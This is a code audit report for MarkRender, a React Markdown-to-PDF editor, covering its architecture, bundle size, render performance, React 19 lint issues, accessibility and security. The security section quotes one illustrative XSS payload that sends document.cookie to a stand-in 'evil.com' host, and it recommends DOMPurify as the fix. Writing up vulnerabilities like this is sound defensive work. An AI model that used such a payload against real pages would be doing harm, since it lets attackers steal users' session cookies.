# MarkRender — Complete Project Analysis

**Date:** 2026-06-30  
**Scope:** Architecture, code quality, performance, security, UX, accessibility, maintainability  
**Verdict:** Solid MVP with meaningful design choices, but several structural and performance issues need attention before scaling.

---

## 1. Executive Summary

MarkRender is a client-side Markdown-to-PDF editor built with React 19 + Vite 7 + CodeMirror 6. It features live preview, YAML frontmatter, KaTeX math, Prism.js syntax highlighting, scroll sync, focus mode, and browser-native PDF export via `window.print()`.

**Grade: B-**  
Well-crafted UI and clear architecture for an MVP. Falls short on performance (1.17MB JS bundle), has React 19 lint violations, missing tests, XSS vulnerability, and no proper state persistence strategy.

---

## 2. Architecture

### What Works
- Clean separation: `components/`, `hooks/`, `markdown/`, `utils/`, `styles/`
- Single-direction data flow: `App.jsx` → children
- Pipeline pattern for markdown rendering (frontmatter → math → markdown-it)
- Imperative handles for CodeMirror integration via `forwardRef` + `useImperativeHandle`
- Design tokens via CSS custom properties
- CSS module separation by concern (base/editor/preview/print)

### Structural Problems

| Issue | Severity | Detail |
|-------|----------|--------|
| God component | Medium | `App.jsx` manages 7 state variables, 8 callbacks, 3 hooks, and all derived computation. Should decompose. |
| No routing | Low | Single-page, fine for MVP. But no multi-document support path. |
| No state management | Medium | All state in `App.jsx`. Works now, breaks if features grow. |
| Tight coupling | Medium | `useScrollSync` needs imperative ref to CodeMirror internals (`scrollDOM`). Fragile on CM upgrades. |
| `renderMarkdown()` on every keystroke | High | Called synchronously in render path. No memoization. Full pipeline (YAML parse + KaTeX + markdown-it + Prism) runs every character typed. |

---

## 3. Performance

### Critical: Bundle Size

```
dist/assets/index-DCPknxZR.js  1,171.12 kB (393.94 kB gzip)
```

Vite warns: "Some chunks are larger than 500 kB after minification."

**Root causes:**
- KaTeX ships 60+ font files (~1MB total in dist). No tree-shaking possible.
- Prism.js with 8 language grammars bundled statically.
- CodeMirror 6 packages all in main chunk.
- No code splitting, no dynamic imports, no `manualChunks` config.

**Fix:** Split vendors via `rollupOptions.output.manualChunks`. Lazy-load KaTeX and Prism. Load languages on-demand.

### Critical: Render Performance

```jsx
// App.jsx — runs on EVERY keystroke
const { html, metadata } = renderMarkdown(markdown);
const stats = getStats(markdown);
```

This parses YAML, processes KaTeX regex, runs markdown-it with Prism highlighting, and computes word stats — **synchronously, in the render path, on every character**. For large documents (5000+ words), this causes noticeable input lag.

**Fix:** `useMemo` with markdown dependency, or debounce the render pipeline separately from state updates.

### Medium: Scroll Sync

```jsx
useEffect(() => {
  const el = previewRef.current?.getElement?.();
  setPreviewEl(el || null);
});
```

No dependency array → runs every render → triggers re-render via `setPreviewEl` → potential infinite loop (ESLint correctly flags this). 

### Medium: Background Animation

```css
animation: bg-shift 12s ease infinite;
background-size: 200% 200%;
```

Continuous CSS gradient animation. On lower-end hardware, animating `background-position` triggers paint on every frame. Minor, but wasteful for productivity tool.

---

## 4. Security

### HIGH: XSS via `dangerouslySetInnerHTML`

```jsx
// Preview.jsx
<div className="preview-page" dangerouslySetInnerHTML={{ __html: html }} />
```

`markdown-it` is configured with `html: true`:
```js
const md = new MarkdownIt({ html: true, ... });
```

This means raw HTML in markdown is rendered **unescaped** into the DOM. A user pasting malicious content or loading a file from an untrusted source gets arbitrary script execution.

**Example attack:**
```markdown
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

**Fix:** Either disable `html: true` in markdown-it, or use a sanitizer like DOMPurify before setting innerHTML.

### LOW: sessionStorage

Using `sessionStorage` means content is lost on tab close. Not a security issue per se, but data loss risk. No encryption of stored content.

---

## 5. React 19 Compliance

ESLint reports **5 errors, 1 warning** related to React 19 rules:

1. **`useAutosave.js` — ref access during render** (`useRef(...).current` in render body). React 19 strict mode will break this.
2. **`App.jsx` — `setState` in effect without deps** (the `setPreviewEl` call in a dependency-free `useEffect`).
3. **`PrintSettings.jsx` — `setState` in effect** (title sync from metadata).

These aren't just warnings — they indicate patterns that will malfunction under React 19's concurrent features.

---

## 6. Code Quality

### Good
- Consistent code style (Prettier configured)
- JSDoc comments on all exports
- Meaningful variable names
- `memo()` on Toolbar (high prop count)
- `useCallback` for handlers passed to children
- `forwardRef` properly used for imperative APIs
- Error boundary around Preview

### Issues

| Issue | File | Detail |
|-------|------|--------|
| Stale closure risk | `useAutosave.js` | `debouncedSave` captures `setLastSaved` but is created once via ref. Works but fragile pattern. |
| No TypeScript | All | `.jsx` files with no type safety. `@types/react` in devDeps is unused decoration. |
| `eslint-disable` comment | `Editor.jsx` | `// eslint-disable-next-line react-hooks/exhaustive-deps` — suppresses legitimate warning |
| No prop validation | All components | No PropTypes, no TypeScript interfaces. Runtime errors on wrong props. |
| Magic numbers | `useAutosave.js` | `5 * 60 * 1000` — 5 minute delay but comment says "2s of inactivity" (documentation lie) |
| Unused import | `Editor.jsx` | `@codemirror/theme-one-dark` in package.json but never imported |
| `isUserScrollingRef` | `Preview.jsx` | Declared but never set to `true`. Dead code. |

### Missing
- Zero tests (no test framework, no test scripts)
- No CI/CD pipeline
- No Prettier config file (only in devDeps)
- No `.editorconfig`
- No error reporting/monitoring
- No analytics

---

## 7. UX & Design

### Strengths
- Beautiful "Calm Night" dark theme with cohesive design tokens
- Animated gradient background adds personality
- Focus/Zen mode for distraction-free writing
- Keyboard shortcuts for power users (Ctrl+S, F11, Ctrl+Shift+E)
- Responsive layout with mobile breakpoints
- Smooth transitions and micro-animations
- Print settings with page size/margin presets

### Weaknesses

| Issue | Impact |
|-------|--------|
| No light theme | Users in bright environments can't switch |
| No file open/save | Only sessionStorage. Can't load .md files from disk |
| sessionStorage = data loss | Content gone when tab closes. Users expect persistence. |
| `window.confirm()` for New Doc | Ugly browser dialog breaks design cohesion |
| No undo for "New Document" | Clears everything, confirm dialog is only safety net |
| Autosave 5-minute delay | Comment says "2s" but code says 5 minutes. Content can be lost in crash. |
| No document list | Single document only. No tabs, no file browser. |
| PDF export = browser print dialog | Users expect a direct PDF download, not print dialog |
| No drag-and-drop file loading | Missing expected UX for a document editor |
| Focus mode hides preview | Can't zen-write while seeing formatted output |

---

## 8. Accessibility

### Present
- `aria-label` on panels and buttons
- `aria-live="polite"` on word count and focus hint
- `aria-expanded` and `aria-haspopup` on export dropdown
- `aria-pressed` on focus mode toggle
- `role="banner"` on toolbar
- `<kbd>` element for keyboard hints

### Missing/Broken

| Issue | WCAG | Detail |
|-------|------|--------|
| No skip-to-content link | 2.4.1 | Keyboard users must tab through entire toolbar |
| Color contrast | 1.4.3 | `--text-dim` at 0.4 opacity on dark bg likely fails AA (needs calc) |
| No focus indicators on custom buttons | 2.4.7 | `:focus-visible` not styled; outline removed globally |
| SVG icons without text fallback | 1.1.1 | Buttons rely on `aria-label` but labels hidden at mobile breakpoint while `aria-hidden="true"` on SVGs |
| Print settings not a dialog | 1.3.1 | No `role="dialog"`, no `aria-modal`, no focus trap |
| No reduced-motion support | 2.3.3 | Background animation, toolbar entrance animation, button transforms — no `prefers-reduced-motion` query |

---

## 9. CSS Architecture

### Strengths
- Design tokens provide single source of truth
- Print stylesheet properly resets all dark-theme colors
- Responsive breakpoints at 768px and 480px
- Custom scrollbar styling
- Smooth view mode transitions

### Issues
- **No CSS Modules / scoping** — global class names risk collision at scale
- **Google Fonts import in CSS** — render-blocking; should be preloaded in `<head>` or self-hosted
- **Hardcoded Prism token colors** — duplicated in both preview.css and print.css
- **`!important` abuse** — 30+ uses in print.css (acceptable for print overrides but indicates design smell)
- **No container queries** — relies solely on viewport breakpoints
- **`overflow: hidden` on body** — prevents any scroll on the root; could trap focus

---

## 10. Build & Deployment

### Configuration
- Vite 7.3.1 with minimal config (just `base: './'` and React plugin)
- ESLint 9 flat config with React hooks and refresh plugins
- Deployed to Vercel (`.vercel/` folder present)
- `base: './'` enables relative asset paths (good for static hosting)

### Issues
- **No production optimizations:**
  - No `manualChunks` splitting
  - No asset compression config
  - No service worker / PWA manifest
  - No `<link rel="preload">` for critical fonts
- **No `.env.example`** — `.env.local` exists but no documentation on what env vars are needed
- **No `prettier.config.js`** — Prettier in devDeps but no config (uses defaults, fine but implicit)
- **No `.nvmrc` or `engines` field** — no Node version pinning
- **`dist/` committed?** — dist folder exists; should be in .gitignore (is it?)

---

## 11. Dependency Analysis

### Production Dependencies (6)

| Package | Version | Risk |
|---------|---------|------|
| `react` + `react-dom` | ^19.2.0 | Bleeding edge. RC/stable boundary. |
| `@codemirror/*` (5 packages) | ^6.x | Stable, well-maintained |
| `markdown-it` | ^14.1.1 | Stable |
| `katex` | ^0.16.33 | Heavy (fonts), but necessary for math |
| `prismjs` | ^1.30.0 | Legacy pattern. Shiki or Starlight preferred for new projects |
| `js-yaml` | ^4.1.1 | Stable, minimal |

### Unused Dependency
- `@codemirror/theme-one-dark` — listed in package.json but **never imported**. Dead weight.

### Missing Useful Dependencies
- DOMPurify (XSS protection)
- A debounce from lodash or custom (already custom, fine)

---

## 12. Documentation

### Present
- `docs/design.md` — design system documentation
- `docs/prd.md` — product requirements doc v1.1
- `docs/techstack.md` — stack rationale
- `docs/folderstruc.md` — folder structure guide
- `.tracker/decisions.md` — 7 architecture decisions
- `.tracker/status.md` — project status
- `README.md` — project overview

### Issues
- **Comment/doc mismatch:** `useAutosave` JSDoc says "2s of inactivity" but code uses 5 minutes
- **No CONTRIBUTING.md**
- **No API documentation for the markdown pipeline**
- **`dev-journal.md` and `Phase Plan.md`** at root — development artifacts cluttering project root

---

## 13. What's Actually Good

Let me be fair — this project does several things well:

1. **Design cohesion** — The "Calm Night" theme is consistent and polished. Design tokens, animation timing, and color palette show intentionality.
2. **Architecture for MVP** — Clean separation of concerns. Pipeline pattern for markdown is extensible.
3. **CodeMirror integration** — Proper imperative handle pattern, custom theme, correct lifecycle management.
4. **Print CSS** — Thoughtful reset of all dark-theme styles for paper output. Page-break-avoid on tables/code.
5. **Keyboard shortcuts** — Power-user friendly with standard conventions (Ctrl+S, Ctrl+Shift+E).
6. **Focus mode** — Well-implemented with graceful enter/exit animations and ESC hint.
7. **Error boundary** — Prevents preview crashes from taking down the editor.
8. **Responsive design** — Three breakpoints, icon-only buttons on mobile, full-width print panel on small screens.
9. **Frontmatter → document title** — Nice touch updating `document.title` from YAML.

---

## 14. Priority Fixes (Ordered)

### P0 — Must Fix Now
1. **XSS vulnerability** — Sanitize HTML output before `dangerouslySetInnerHTML`. Add DOMPurify.
2. **`renderMarkdown()` in render path** — Memoize with `useMemo(()=> renderMarkdown(markdown), [markdown])`. Still runs every change but at least not on every re-render.
3. **React 19 lint errors** — Fix `useEffect` without deps, `setState` in effects, ref access during render.

### P1 — Fix Soon
4. **Bundle splitting** — Add `manualChunks` to split CodeMirror, KaTeX, Prism into separate chunks. Lazy-load math/syntax if possible.
5. **Autosave interval** — 5 minutes is too long. Use 2-5 seconds for real autosave. Use `localStorage` not `sessionStorage`.
6. **Add `prefers-reduced-motion`** — Disable background animation and transitions for users who need it.
7. **Remove unused `@codemirror/theme-one-dark`** dep.

### P2 — Should Fix
8. **TypeScript migration** — `@types/react` already installed. Convert `.jsx` → `.tsx` incrementally.
9. **Add testing** — Vitest + React Testing Library. At minimum: parser pipeline, word count, storage utils.
10. **Font loading** — Move Google Fonts to `<link rel="preload">` in `index.html` or self-host.
11. **Focus trap in PrintSettings** — Make it a proper dialog with focus management.
12. **File I/O** — Add drag-and-drop .md file loading and File System Access API for save.

### P3 — Nice to Have
13. **Light theme** toggle
14. **Multiple documents** / tabs
15. **PWA manifest + service worker** for offline use
16. **Mermaid diagram support** (deferred per decisions.md)
17. **Collaborative editing** via CRDT (future architecture consideration)

---

## 15. Metrics Summary

| Metric | Value | Verdict |
|--------|-------|---------|
| Bundle size (JS) | 1,171 kB | ❌ Over 2x recommended limit |
| Bundle size (gzip) | 394 kB | ⚠️ Heavy for content tool |
| ESLint errors | 5 | ❌ React 19 violations |
| ESLint warnings | 1 | ⚠️ |
| Test coverage | 0% | ❌ No tests exist |
| TypeScript coverage | 0% | ❌ Pure JS |
| Accessibility | Partial | ⚠️ Good intent, gaps in execution |
| Security (XSS) | Vulnerable | ❌ `html: true` + no sanitizer |
| Build time | 3.92s | ✅ Fast |
| Dependencies (prod) | 11 packages | ✅ Lean |
| Code splitting | None | ❌ Single chunk |
| Lighthouse (estimated) | ~70-80 | ⚠️ Bundle weight drags Performance |

---

## 16. Final Verdict

MarkRender is a **well-designed MVP** that shows strong UI/UX sensibility and clean architectural thinking. The "Calm Night" design system is cohesive, the markdown pipeline is extensible, and the CodeMirror integration is properly handled.

However, it ships with a **critical XSS vulnerability**, a **performance bottleneck** (synchronous render pipeline), **React 19 compliance issues**, and a **1.17MB unplit bundle**. The 5-minute autosave with sessionStorage means real users will lose work.

For a portfolio/demo project: solid B+.  
For production use: needs the P0 and P1 fixes before shipping to real users.
